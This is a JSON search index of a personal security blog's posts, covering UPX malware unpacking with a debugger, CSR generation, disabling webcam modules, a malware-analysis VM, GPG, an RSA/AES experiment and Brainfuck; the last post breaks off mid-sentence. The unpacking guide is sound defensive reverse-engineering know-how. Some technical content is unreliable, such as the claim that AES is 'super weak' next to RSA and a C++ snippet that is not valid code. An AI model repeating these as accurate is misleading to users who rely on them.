[ { "title": "Unpac UPX malware with SINGLE breakpoint", "url": "/blog/posts/Single-Breakpoint/", "categories": "Malware", "tags": "malware, upx, reverse engineering", "date": "2021-11-21 12:12:12 +0530", "snippet": "Dynamically unpacking UPX payload from memory.What is UPX?: Ultimate Packer for eXecutables (UPX) is a free and opensource executable packer. This usually is short for “runtime packers” which are also known as “self-extracting archives”. Software that unpacks itself in memory when the “packed file” is executed. Sometimes this technique is also called “executable compression”. This type of compression was invented to make files smaller. So users wouldn’t have to unpack them manually before they could be executed. But given the current size of portable media and internet speeds, the need for smaller files is not that urgent anymore. So when you see some packers being used nowadays, it is almost always for malicious purposes. In essence to make reverse engineering more difficult, with the added benefit of a smaller footprint on the infected machine. ~ blog.malwarebytes.comFrequency of UPX in malwareActually, it’s pretty low, UPX is a relatively very simple and well-documented packer and you don’t want that as malware author. But still, we see some low life malware using UPX as the only packer and some intermediate malware using it in their second or nᵗʰ stage.In my limited experience as a cybersecurity student, I’ve seen it enough times to conclude that this trick is still relevant.SetupTo make sure this trick still works with the latest UPX version available (release 3.96), I created a small application in C++ and then packed it using UPX, then unpacked it using this trick and compared the results.Creating a simple payloadA small program which asks for a integer x and gives x*x ,Statically linked, PEBear analysis -And looks like any other typical C++ code in IDA,Packing with UPXNotice the sections are reduced to only 3- UPX0,UPX1 and UPX2. Also, the size of the file is reduced (63.34% compression ratio) and let’s see the final IDA call graph for reference.One Breakpoint TrickYou can do this with any debugger, I am going with x32dbg for this one.x32dbg will put a breakpoint at PUSHAD or EntryPoint of your binary by default — (we will discuss at last what PUSHAD does.)PUSHA/PUSHAD — Push All General-Purpose Registers (https://www.felixcloutier.com/x86/pusha:pushad)Step 1 (searching):Load the binary in your debugger and search for POPAD instruction.Step 2 (setting BP):Look for next JMP immediately after POPAD and set your breakpoint there.Step 3 (finding OEP):Run the program till it hits JMP breakpoint.Now single step into the JMP, this will take you to the OEP (Original Entry Point) of the packed binary.We get **004014A0** as our OEP, now we will extract this unpacked binary from this OEP.Dumping unpacked PE and fixing Import TableNow we will dump the PE starting from its OEP, for this I am using Scylla plugin for x32dbg,If you are using the same, click on this ‘S’ button in your toolbar.Pick your current process in ‘Attach to an active process’, and make sure your OEP is correct, let’s fix that in our case -Then click ‘IAT Autosearch’ to scan for Imports.Click ‘Yes’ when it askes for advanced result. When completed, click on ‘Get Imports’ to list all the imports found.Then click on ‘Dump’ to dump the extracted binary.and finally click ‘Fix Dump’ and choose recently dumped binary to fix its IAT.In our case simplenum_packed_dump_SCY.exe is the final unpacked binary, to check it let’s open it in IDA and compare the call graphs.We can see all the original strings and similar program structure! Our method is complete here, but if you want you can read further to know why this works.Why this works?This is the result of a well known UPX property, when you pack any Executable with UPX, all existing sections (text, data, etc) are compressed. After compression, these are named UPX0, UPX1 etc. Then it adds a new code section at the end of the file which will decompress all the packed sections at execution time.During execution it follows following steps - Saves all register states with PUSHAD Unpacks all section in memory Dynamically resolve IAT Restore the register state using POPAD Jump to OEP and execute main code.In our trick, we put breakpoint just after step 5, when it has jumped to OEP, and we dump the PE from there and fix IAT without completing the execution.ConclusionWith some practice and experience, you can easily find this JMP to register in the call graph without searching for POPAD, and you can quickly unpack any upx binary.Why not use UPX tool itself to unpack?Because sometimes you might get UPX packed binary in the second or third stage of malware, mostly it will be memory injected and ‘mapped binary’ hence UPX tool will not work, but this is a discussion for another article.In this tutorial we walked through a UPX packed binary, if you’re interested in learning how to unpack other types of packers, checkout Guided Hacking’s Unpacking Tutorials(https://guidedhacking.com/threads/how-to-unpack-packed-files-tutorial-series.17522/)" }, { "title": "Create a CSR in Windows 11/10", "url": "/blog/posts/CRS-in-Windows/", "categories": "Windows", "tags": "windows, CSR, HTTPS", "date": "2021-10-08 12:12:12 +0530", "snippet": "How to create your own Certificate Signing Request for SSL implementation.What is a CSR? - A certificate signing request (CSR) is the initial step to implement SSL/TLS on your server. The CSR is generated in the target server itself and contains important information about your server like — domain, country, owner details and general contact details along with the public key of the organization/individual which is signed by their respective private key.The Certificate Authority (CA) will use the data from the CSR to build your SSL Certificate.Key information in a CSRA general purpose CSR will contain the following information -Common Name (CN): your domain or a domain wildcard.Organization (O): Name of your organization.Organization Unit (OU): Sub-unit/division of above organization which will handle this certificate.**Locality (L): **The city where your organization is located. (This shouldn’t be abbreviated.)State/County/Region (S): The State where your organization is located.Country (C): The ISO_3166-1 two-letter code for the country where your organization is located. (eg. IN/US/GB/AU/RU/CN)Email (Email): Your/organization’s department’s email address.How to create signing request in Windows?Using certreq.execertreq.exe is a tool in Microsoft Windows which can create a CSR.To create one, you will need to follow 3 simple steps.Step 1: Setup base information in *.ini fileIn this step, you need to fill your information in a specific format (like one given below) which will be used by certreq.exe to create your CSR.You can use the file below as a template. Be sure to change the contents of Subject according to your use case. Key values in “Subject” field are your CN, OU, O, et cetera. as discussed in previous section.You can leave the rest as it is. This template will generate RSA (KeySpec = 1) 2048 (KeyLength = 2048) bits keys.Step 2: Generate the CSR.After you save the above file, you can run the following command in an admin shell to generate your CSR. (I’ve saved the file as CSRinformation.ini) certreq.exe -new .\\CSRinformation.ini CSRrequest.txtThe generated CSR will be stored in CSRrequest.txtStep 3: Validating the generated CSR.The generated CSR’s structure should look similar to the one given below, the contents should/will be different.Now you can submit this in a CSR checker to validate your request before submitting this in your CPanel.More resources: You can also generate a CSR with IIS Manager in Windows, this method is well covered in ssl.com’s article; here is a link for the same — https://www.ssl.com/how-to/generate-a-certificate-signing-request-csr-in-iis-10/ You can read more about certreq.exe and the parameters of the *.ini file in the official documentation — https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/certreq_1 You can check your CSR’s validity at —https://www.digicert.com/ssltools/view-csr/ " }, { "title": "Modprobe for peace of mind", "url": "/blog/posts/modprobepeace/", "categories": "Linux", "tags": "modprobe, kernel module, privacy", "date": "2021-06-06 12:12:12 +0530", "snippet": "modprobe intelligently adds or removes a module from the Linux kernel. modprobe looks in the module directory /lib/modules/uname -r for all the modules and other files, except for the optional configuration files in the /etc/modprobe.d directory.~(man)ual pagesKernel and Kernel Modules in LinuxIn Linux you can add capabilities to base kernel via ‘kernel modules’. These are programs that you can load at kernel level and then use the exposed APIs to communicate with your assets. This is how most of the drivers work in Linux, they load their kernel modules and extend the capabilities of kernel to do what they want to achieve and then run rest of the code at user level using the newly exposed functions of kernel.Kernel modules and PrivacySo as we know that kernel modules are being used to drive devices, how about we remove these drivers and disable the device at kernel level?That’s exactly what we are going to do, turning off camera is one thing, but removing the cam driver itself is sometimes overkill but a necessary evil. The image below visualizes this idea nicely.Let’s say we want to block our webcam, then we will just remove (unload) the camera kernel module (driver) doing so will disable the only link between hardware and your programs, hence forbidding any usage of webcam feed in future unless you reload the drivers, or if you don’t use your camera at all or the concerned device is production machine with attached camera, you can directly blacklist the drives and modules, that will deny inclusion of that module during boot procedure.Basic unload syntaxTo unload any module use modprobe -r &lt;module_name&gt;, this will remove the module from current running kernel (the module will load again on reboot).Blacklisting procedureTo blacklist a module - nano /etc/modprobe.d/blacklist.config (or use your fav. text editor). add blacklist &lt;module_name&gt; as newline in the file and save it. The module will not be loaded next time you boot. Note : blacklisted modules can be manually loaded via modprobe &lt;module_name&gt; or insmod utilities.How to disable your webcam?To disable your webcam, you need to unload uvcvideo module, you can read more about this module hereTo do this with modprobe, sudo modprobe -r uvcvideo should do it. Now try to open any application that uses camera. To visualize this, you did something similar to -Similarly you can handpick specific drivers and modules and unload them or blacklist them (for camera module add a new line → blacklist uvcvideo in /etc/modprobe.d/blacklist.config and reboot).lsmodTo list all loaded kernel modules you can use lsmodmodinfoYou can also use modinfo to get information about the module.Be carefulBE SUPERDUPERHYPER CAREFUL when unloading kernel modules, one bad move and there goes your whole system burning down into a beautiful crash!Closing thoughtsThis will protect you from 90% of malware attacks and 100% user error based oh-shit-my-cam-was-open shame.This will not protect you from people who know what they are doing, but will increase their efforts and might act as deterrent." }, { "title": "5 Step Malware Lab in Hyper-V", "url": "/blog/posts/MalLab/", "categories": "Malware", "tags": "VM, malware analysis", "date": "2021-05-11 12:12:12 +0530", "snippet": "I've created and uploaded a fully loaded malware analysis lab based in Windows10 and Flare stack, and exported it so that anyone can import it as a VM in HyperV, In this article we will see how.Creating your own malware analysis lab can be time consuming and hectic, to setup all the tools required might take 2–3 days if not a whole week for a beginner.It took me 2 weeks to develop a stable malware analysis lab when I was getting started, finding all the tools, automation scripts and even setting up a VM was a challenge.So I’ve created a complete VM pre-installed will all the required tools and an activated development copy of windows10 for 90 days which you can simply import in your computer in mere clicks.Pre-installation requirements You need stable internet connection to download ~16.2GB data. Windows 10 Pro/Enterprise/Education (Only they have Hypervisor installed) 64-bit Processor with Second Level Address Translation (SLAT). CPU support for VM Monitor Mode Extension (VT-c / VT-x on Intel CPUs). Minimum of 4 GB memory ~100GB free storage space. 7zip archive manager to extract .7z file, you can download this for free from HEREActivate Hyper VisorSearch for Hyper-V Manager in your windows search you should get something like —If you don’t see it, you may need to enable it. Follow the official guide below to do so HEREOnce this is done, we can start our main endeavor.Download the VM packageThis is the only part where you will need internet data to download a large file (16GiB), this is my compressed export files from my own setup.Go to the GitHub repository given below and click the download link, if I ever change my file location, it will be updated here so it will be always available to you no matter when you are reading this post.Saket-Upadhyay/HyperV-malwareanalysis-VMInstallationStep 1 : Extract the archiveUse 7z archive manager to extract the downloaded file in location of your choice.Step 2 : Start Hyper-V ManagerSearch for “Hyper-V Manager” in your windows search and run it.Step 3 : Import VMClick on ‘‘Import Virtual Machine’’ option.Then you will need to select the folder to import VM from, go ahead and select MSEdge — Win10 from the extracted folder.Select “Fresh Install (with Flare, 90days activation)” and click NextSelect “Register the Virtual Machine in-place” and click NextClick Finish.Wait for the import to complete.Step 4 : Create checkpointTo be able to revert back to your activated windows create a checkpoint to reverse everything will fresh install.Right click on the new VM and click “Checkpoint”Wait for it to complete and you will see new checkpoint in “Checkpoints” section.DONE! you have successfully installed the VM in your PC.Step 5 : Start your VMTo start your VM click Start from side panel or right-click on the VM and select “Start”Once it’s running, Right-click again on VM and select “Connect” to connect your display to VM.Select your preferred resolution, I suggest “Full Screen”. Click Connect.User PasswordYou will be asked for password to log-in IEUser, password is : Passw0rd!After that you will see your OS screen, at your service.ConclusionAll the tools are installed in Flare folder.I hope this will make your LAB-Setup process easier and you will be ready to dive into enormous world of Malware Analysis.Resources - https://github.com/fireeye/flare-vm https://cybersecnotes.com/set-up-a-malware-analysis-lab-with-windows-hyper-v-and-flare-vm.html https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/ " }, { "title": "Why I want to do a Doctorate?", "url": "/blog/posts/whydoc/", "categories": "Personal", "tags": "phd, doctorate", "date": "2021-01-01 00:00:00 +0530", "snippet": "\"Life is a matter of choices, and every choice you make makes you.\"- John C. MaxwellThe pressure is real if you ask me, as you approach the last year of your college, it increases, the pressure to earn, the pressure to stand on your own, the pressure to get a ‘job’.But I don’t want a job right now, I mean I want a job eventually, but not right now, and to be more specific, not a corporate one.It’s not like that I cannot do it, more like I don’t want to. If you would’ve asked me three years earlier, all I wanted to be was a penetration tester or a security engineer in a good company and work my way up from there to CISO or something. But that was old me.Now I know, now I understand and now I want to explore more.You see, It’s the curiosity, that I am afraid will eventually die in the corporate world, the world full of robots, doing what they are told to do.Also, I don’t like to be limited if you know what I mean, I want to explore the domain on my terms. The InfluenceYou can say that my professors have a strong influence on me and their friends who are researchers and doctorates, their professors and their professor’s professor. Do you see it? If you start tracing the people who’ve influenced me to take this path, you will find yourself in a complex web of highly professional and educated people in the world.Getting a privilege to work with some of the great minds in the field takes a toll on you, you admire them for their knowledge and deep down want to be like them when you grow up. Or you can say, you start to look up to them as a guiding star and want to follow them.Also, I see people who keep exploring and expand the boundaries of what we think is conceivable, they play a significant role in overall human evolution.And also in movies, they save the scientists first because they only know how to get sh*t done, so it’s a win-win hahaha.Why a PhD? Why academic research?The domain.What can I say… I love my work field, it’s significant, it’s critical, it’s complex, and it’s the future. Seriously, I can’t even imagine a single future without the need for advance and adaptive cyber defence.Freedom.This is imperative - Freedom.I love how ‘I’ decide what I want to work on, ‘I’ choose how I want to do it.I don’t like to work like a robot taking all the orders from others and I don’t certainly enjoy the typical job where you work under a person you call ‘boss’ and they work under someone else they call ‘boss’ and so on.For the record, I have nothing against it. It’s good, and effective most of the time, just not for me.I would rather “discuss” with my guide/professor, how should I approach the problem that I chose to work on. It’s this feeling of working together and learning stuff along the way, goes both ways.I like to talk to people to discuss their views on the topic, I usually get surprised by the fact that how differently a problem can be solved just by talking to a person with a different mindset and point of view.The intensity of research.The job is not easy. research is hard, intense and needs commitment and consistency. But the result is worth it, it’s not just acceptance of your papers and praise of your poster, it’s the knowledge you gain in the process, you understand things and discover sections that 98% of people in the world don’t even know about.Plus if you are passionate about something then it’s not a burden, it’s your daily routine. You wake up with a goal, you organise stuff accordingly, you plan for the short and long term and then you devote your time to your subject. It can be overwhelming sometimes, but never hectic or stressful in a bad way.Overall these activities make you a better person, who learns to organise and plan everything in life, not just work and will glide through most of the ups and downs of life, just because it was all calculated and predicted.Respect.People respect you for your knowledge, passion and contribution as a researcher. It’s important, it gives you meaning and motivation to continue what you are doing because you know that people are supporting you, respect and peace of mind is important in any work, and I think academics and research is one of those jobs.Opportunity to Educate and get EducatedIt goes both ways, as you learn and as you grow. You, as a researcher, also learn to respect people irrespective of their status and education.If other person knows more than you, you respect their knowledge and skill and learn from them, if they are less educated, you respect their will to know things out of their comfort zone and help them learn and educate them and see their perspective on the problem as they are not blinded by existing knowledge and they can think out of the box." }, { "title": "RSA is NOT used to encrypt LARGE files?", "url": "/blog/posts/rsanotonlargefiles/", "categories": "Security, Cryptography", "tags": "rsa, encryption, cryptography", "date": "2020-12-25 00:00:00 +0530", "snippet": "Practical Understanding of Public-Key based Encryption Strategies and their Efficiency.Why do PGP / GPG and other encryption tools have \"encrypt with RSA\" option?And, what’s even the use of this if we can’t use it to encrypt large files?Are you saying RSA is useless? and if not, where it is used then?… In this article, we will try to understand all the above questions and more, with an experiment and some basic theory to back it up.Basic PrerequisiteIt is assumed that you have some initial knowledge of RSA and Public-Key Cryptography and Cryptography in General… or at least you heard these terms earlier… anyways, here is a super-short reference.Public Key Cryptography (Asymmetric Cryptography) Public-key cryptography, or asymmetric cryptography, is an encryption scheme that uses two mathematically related, but not identical, keys — a public key and a private key. Unlike symmetric key algorithms that rely on one key to both encrypt and decrypt, each key performs a unique function. The public key is used to encrypt and the private key is used to decrypt. ~globalsign.comWhat is RSA? RSA (Rivest–Shamir–Adleman) is a public-key cryptosystem that is widely used for secure data transmission. It is also one of the oldest. The acronym RSA comes from the surnames of Ron Rivest, Adi Shamir, and Leonard Adleman, who publicly described the algorithm in 1977. ~WikipediaTo understand this, I’ve prepared a small, simple and cute experiment in python3.Here’s what we will do, Create a File (relatively small,725 KB, for this demo.) with “Random” Printable ASCII one-liner data. (7,41,600 characters in this demo.) Do the following routine for AES,RSA and AES+RSA (just read it now, will explain later what AES+RSA means) :- (i) Generate Keys for Encryption (ii)Encrypt File (iii)Decrypt File (iv) Check MD5 hash of Original File v/s Decrypted file (should match) Clock each of the above steps and the whole program runtime = RT Take Avg.RT out of 5 Consecutive runs of each encryption and compare. Provide the Results of some theoretical backbone. The ExperimentEncryption Parameter DetailsRSA: Key_Length = 1024 bits |Mode = PKCS1_v1_5 |Encoding = base64AES: checksum = SHA256 |Length = 32 |Salted = Yes |Iteration = 1,00,000 |Mode=Cipher Block Chaining (CBC)CodeIf you want to perform this experiment in your computer (which you should), here is my GitHub Repo containing all the code and an academic lab record which I summited for grading 👀CHECK THIS GITHUB REPOSITORYResultRSA Only:-In above screenshot, Result of RSA only bulk encryption clocked at 33.85 seconds!AES Only:-In above screenshot, Result of AES only file encryption clocked at 0.32 seconds!Any explanation for this mayhem? Yes.At last, most of the things in RSA breaks down to one thing, SDMDPN … Image Credits: Optimus Prime (Team Lead, Auto Bots Inc. )As the size of data increases, the process load increases and the whole thing ends up taking too much time to complete. Also, “As a rule of thumb, you can only encrypt data as large as the RSA key length. So, if you’ve got a 4096-bit RSA key, you can only encrypt messages up to 4096 bits long” ~security.stackexchange.comOn the other hand, AES is a simple symmetric crypto. it doesn’t play with such large primes, ultimately encrypts data fast.But AES or any other symmetric key crypto. is super weak in comparison to RSA’s security and its anti-Bruteforce stance.The Balance of Speed and Security (AES+RSA) In Frame: Late Mr. ThanosWell, PKC was never meant to encrypt large files, instead, we use it to encrypt AES’s encryption key. So we encrypt the large datafiles with good symmetric encryption and then we use strong public-key encryption to encrypt the key of symmetric encryption used to encrypt the large file and we share this encrypted Symmetric Key, and the encrypted File which can be decrypted with receiver’s private key.And this is what all encryption tools mean when they say \"Encrypt with RSA\"Here is the performance of the same in our experiment :In above result, AES+RSA bulk + key encryption clocked at 1.09 seconds!Mean Runtime ObservationImage Src: My college assignment document :-)ConclusionWe can see from the above Mean RT table that why the standard approach is better and how poor RSA performs with large files.And that’s why we don’t use RSA on large files, directly. . . . Bonus ContentR.I.P. (x_x)But if you said RSA cannot encrypt more data than Key-Size then how did we encrypt the file with it?Well, instead of encrypting the whole file, I divided the file into blocks of 86 characters and then stored them in encrypted file line-wise, then to decrypt we read the file line-by-line and then decrypt and concatenate the results to get original data. 😬…" }, { "title": "Secure your work like a Pro", "url": "/blog/posts/Secure-Work/", "categories": "Security", "tags": "gpg, encryption, privacy", "date": "2020-11-21 12:12:12 +0530", "snippet": "Utilizing PGP Keys to Encrypt Everything you have.If you have some super private or confidential data on your computer and don’t want anyone to have it, even if they have login access of your computer, then you already know the answer to “Why should we do this”.Now all that remains is “What” &amp; “How” and that’s what we are going to talk about today. Let’s have quick look into TOC for this article… Difficulty : Intermediate, (or easy, once you know the basic concepts and process of public-key crypto.)What’s PGP &amp; GPG?Pretty Good Privacy or PGP uses several encryption technologies, like hashing, data compression, and public/private PGP keys to protect an organization’s critical information. BUT, it’s propriety owned by Symantec.Yes the makers of Norton Antivirus.Luckily there is OpenPGP, it is an open source standard that allows PGP to be used in software that is typically free to the public. The term “Open PGP” is often applied to tools, features, or solutions that support open-source PGP encryption technology.And now GnuPG or GPG, stands for GNU Privacy Guard. GPG is a different implementation of the Open PGP standard and a strong alternative to Symantec’s official PGP software. “GnuPG is a complete and free implementation of the OpenPGP standard as defined by RFC4880 (also known as PGP). GnuPG allows you to encrypt and sign your data and communications; it features a versatile key management system, along with access modules for all kinds of public key directories. GnuPG, also known as GPG, is a command line tool with features for easy integration with other applications” ~ https://gnupg.org/And that’s what we are gonna use.How to set up our GPG keys?Installing GPG in Linux and MacOS 🐧 🍎Usually it’s already installed, but should this is not be the case with you, you can download the GPG source from :-https://gnupg.org/download/index.htmland Compile it using the Instructions from official manual : https://gnupg.org/documentation/manuals.htmlIf you are in Debian-base system, then you might be able to do:-$ sudo apt-get install gnupg to install it via repos. or $ sudo yum install gnupg for CentOS, Fedora, RHEL etc.Installing in WindowsGPG is not usually default in windows and you might need to install it on your own, don’t worry you can download gpg4win from official source : https://gnupg.org/download/.OR you can refer following PDF from http://www.ibiblio.org/shadow/pgp/install-gpg.pdfIn short it follows the simple windows installation and the command are same for everything via powershell.So once you’ve installed it, you are golden.Generating New Key Pair 🔑Now as we have installed gpg, we need to generate our new key pair to be used for signing and encryption.Why I said key “pair” ? Check this out ➡️ https://cheapsslsecurity.com/blog/what-is-asymmetric-encryption-understand-with-simple-examples/Anyways, let’s generate ours.To generate key pair, open terminal and type :-$ gpg --full-generate-keySelect 1 , it means we will use RSA for both signing and encryption.Next it will ask for Key Size. To be on safe side use 4096 bits long key. Just input 4096.Next it will ask you to set expiration, for now we will set key does not expire, input 0 here and continue.Next it will confirm your input, just say y and continue. Then it will ask you to enter your basic details, to associate your keys with, give ’em that.After that it will confirm your inputs, check it and if it’s okay, input O and continue.Then it will ask you for your password, FILL THIS CAREFULLY.Here I chose 1234 for the sake of this article, make sure you provide strong password that you can remember.Confirm the password and select OK (press enter key).After this you might see something like this :-This is because we need to generate high entropy random number, just move your mouse around and it would be fast, you don’t need to do anything special in this, gpg is collecting random values from your system so just wait.After this is done, we will have our keys generated :YAY !! Now you have your own key pair !See your keys 👀You can see all you keys in the key-ring by:-gpg --list-keysHow to use these keys ?So now we have our keys, let’s put them to good use for encrypting and signing (topic for another article :-) )Encrypt Your Data 🔐To encrypt any data : gpg --encrypt &lt;file_to_encrypt&gt;It will ask for recipients, type your Name or EmailID here (which is used to generate keys) and Press “enter key” to end the prompt. This will encrypt the file with your encryption public key (or someone else’s public key if you have it in your keyring and provide their Name or Email in recipients section.)After that, you will see new file imp.txt.gpg which is our encrypted file.Let’s see the difference:-As we can see that our imp.txt.gpg is encrypted, and we can delete original imp.txt file.Now we only have our encrypted file.Decrypt Your Data 🔓To decrypt the file :-gpg --decrypt &lt;encrypted_gpg_file&gt;Provide your password that we used when creating the key, in this case 1234.In this case we got our answer on stdout, we can divert it into a file by redirection :- gpg --decrypt imp.txt.gpg &gt; imp.txtWe can check the contents of the decrypted file by simply using cat in this case.Closing words ✏️Now we have basic setup for gpg encryption and can encrypt ANY file we want in our workflow.There is more to it, can we can combine different tactics for ultimate security / signing etc. but that we will try to cover in future articles.So see ya in next one, till then, stay caffeinated!Resources 🌱 https://gnupg.org/ https://www.varonis.com/blog/pgp-encryption/ https://itsfoss.com/ubuntu-keyring/" }, { "title": "How to (code in) BrainF*ck?", "url": "/blog/posts/code-brainfuck/", "categories": "Misc.", "tags": "brainfuck", "date": "2020-09-16 00:00:00 +0530", "snippet": "A DETAILED GUIDE ON BRAINF*CK FOR BEGINNERS AND ENTHUSIASTS.Brainfuck is the most famous esoteric programming language, and has inspired the creation of a host of other languages. Due to the fact that the last half of its name is often considered one of the most offensive words in the English language, it is sometimes referred to as brainf, brainfck, brainfsck, bfuck (as a joke), brainfk, branflakes, brainoof, brainfrick, or bf.First Things First Note : After reading this article, be prepared to FLEX ᕦ(ò_óˇ)F**king Basics !BF operates on an array of memory cells, each initially set to zero. The size of the array is not defined as standard but was 30,000 cells long in initial implementation. But this can be different depending on the implementation. Also generally the value of each cell is between the range (0–255) and if somehow it goes beyond this, it is reset to the nearest integer (i.e. 0–1=255 and 255+1=0).8 OperatorsThere are total 8 operators in BF,Anything other than +-&lt;&gt;,.[] is ignored in original basic implementation. And I think it’s genius ! These are just the simple operations one needs to do basic programming.Stack ManipulationOur overall goal is to control the values and pointers of stack to get the output we want. More on it later.Understanding Each OperationPointer Shift { &lt; &gt; }:The right shit &gt; operation will shift the stack pointer to right by 1 step and, left shift operation &lt; will decrement the stack pointer position by 1, that means it will shift stack pointer to left by 1 step.Increment &amp; Decrement { + - } :The increment and decrement operations + — manipulate the values AT location of stack pointer, Increasing or Decreasing them by 1.Input &amp; Output { , . }:These do that they say they do, . will print the ASCII representation of value stored in current pointer location. And , will take input and write it at current pointer location.Looping { [ ] }:This concept is relatively difficult to understand (with respect to above operations) at first, but once you do, you are golden.So anything between [ and ] is considered a loop, whenever [ is encountered it checks the value at current stack pointer if it’s not zero (0) it will continue to execute code after it, but if it is zero (0) then it will skip to the code after corresponding ] .If ] is encountered, it will continue the code (i.e. will not loop) if value at current stack pointer is zero, otherwise it will execute code after corresponding [ encountered earlier.Elemental C++ Representation :So you know some basic C++? Cool! this might help you :#include&lt;iosteam&gt;using namespace std;int main(){ int STACK[100]; //ALLOCATION OF 100 ELEMENTS ; CELLS int *iptr; //INIT STACK POINTER iptr=&amp;STACK; //ASSIGN POINTER TO 1ST ELEMENT // &lt; &gt; OPERATION iptr++; // &gt; iptr--; // &lt; // ================================= // + - OPERATION *iptr++; // + *iptr--; // - // ================================= // , . OPERATION cout &lt;&lt; *iptr; // . cin &gt;&gt; *iptr; // , // ================================= // [ ] OPERATION :openloop if(*iptr == 0) // [ goto closeloop; else: continue // EXECUTE CODE BETWEEN [...] if(*iptr == 0) // ] goto closeloop; else: goto openloop; :closeloop // ================================= //AFTER PROGRAM ENDS delete iptr; return 0;}Program VisualizationLet us see what we mean by stack operation and everything we talked about earlier.In the above stack let’s see what basic operations do:If we just execute + we will see that the value of current stack pointer position is incremented by 1.If we do ++++++++++ , (i.e. 10 times +)we will see …Now let’s do &gt; and we will see that the pointer to stack moves to right by 1 step.Easy right? Let’s try this : +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++Just so that you don’t start counting, it’s 65 times + then &gt; then 66 times + then &gt; then 67 times + . So this will give is 65,66,67 in consecutive cells.Now these values are ASCII Equivalent of A,B and C respectively, let’s check out .So let’s go back 2 cells by &lt;&lt; and then print its content by a . , that should print ASCII of 65 -&gt; A . So the code becomes :Awesome! Now if we shift right by one step and print the ASCII and then again shift right and print, we will get complete ABC So can you tell me the code we need to add to achieve this?Yes, we can just add &gt;.&gt;. to our above created program, which will give us :+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&lt;&lt;.&gt;.&gt;.And this will result in :In this way we can print anything we want !!Un-F**king “Hello World”Now you know how to print ASCII characters, so can you print “HELLO WORLD” by using above discussed method?For your reference here are the ASCII codes for all the characters of “Hello World”So simple approach is increase the value of current cell to our ASCII value then print it with . and move on to next cell by &gt; and then repeat until we get our output.Following similar strategy we will have this code :++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++.&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++.&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++.&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++.&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++.&gt;++++++++++++++++++++++++++++++++.&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++.&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++.&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++.&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++.&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++.This will give us :Code OptimizationLooping : Optimization Part 1First of all, Congratulations! You have made your first program in BF.Now, let’s optimize it. It’s actually simple, just answer this; Q: How can we represent 65? Ans 1: 1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1 Ans 2: “(10x6)+5“ OR “13 x 5”If we observe, we wrote our previous program using 1st logic, now let’s do it using 2nd logic.The multiplication is nothing but continuous addition right? and we know that we can do something over and over again via loops, so, let’s try this.+++++[&gt;++++&lt;-] This will increment value of 2nd cell by 20.How? Simple, How many + are there in cell 1? (ans = 5), now refer to the logic we discussed earlier via C++ program. The loop will execute until this value is zero.Code inside loop : &gt;++++ &lt;- This will move pointer to next cell, add 4 to it, go back to previous cell and subtract 1 from it, and repeat.Then the loop will check the value of the pointer (i.e. element 1) and run the code till it’s zero.Now if we add 4 to the next cell 5 times we will get 20 (4x5) as it will take 5 turns to zero out 1st element (-1x5 = -5). Let’s see this step by step, (Bold and underlined instruction(s) is(are) under execution)Step by Step Loop :+++++[&gt;++++&lt;-]+++++[&gt;++++&lt;-]+++++[&gt;++++&lt;-]+++++[&gt;++++&lt;-]+++++[&gt;++++&lt;-]+++++[&gt;++++&lt;-]+++++[&gt;++++&lt;-]+++++[&gt;++++&lt;-]+++++[&gt;++++&lt;-]+++++[&gt;++++&lt;-]+++++[&gt;++++&lt;-]Now as we have 0 at pointer location, ] will NOT return to [ and will end the loop.Phew.. that was lots of screenshotsOkay now instead of increasing the value of each element by + we can use loops to get the nearest value and then add or subtract minor digits to get our desired result.That being said, can you now try to understand this code? (I’ve commented the logic too) :+++++ +++++ //LOOP 10 TIMES[&gt;+++++ ++ //SET VALUE TO 10x7=70&gt;+++++ ++ //SET VALUE TO 10x7=70&gt;+++++ +++ //SET VALUE TO 10x8=80&gt;+++++ +++ //SET VALUE TO 10x8=80&gt;+++++ +++ //SET VALUE TO 10x8=80&gt;+++&gt;+++++ ++++ //SET VALUE TO 10x9=90&gt;+++++ +++ //SET VALUE TO 10x8=80&gt;+++++ +++ //SET VALUE TO 10x8=80&gt;+++++ +++ //SET VALUE TO 10x8=80&gt;+++++ ++ //SET VALUE TO 10x7=70&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;-]// Now we do minor adjustments to all values and print&gt;++. // 70 + 2 = 72 -&gt; H&gt;-. // 70 -1 = 69 -&gt; E&gt;----. // 80 -4 = 76 -&gt; L&gt;----. // 80 -4 = 76 -&gt; L&gt;-. // 80-1 = 79 -&gt; O&gt;++. // 30+2 = 32 -&gt; space&gt;---. // 90-3 = 87 -&gt; W&gt;-. // 80-1= 79 -&gt; O&gt;++. // 80+2 = 82 -&gt; R&gt;----. // 80-4 = 76 -&gt; L&gt;--. // 70 -2 = 68 -&gt; DThe first part of stack setting will give us :And then after minor adjustments we get :So the overall compressed code looks 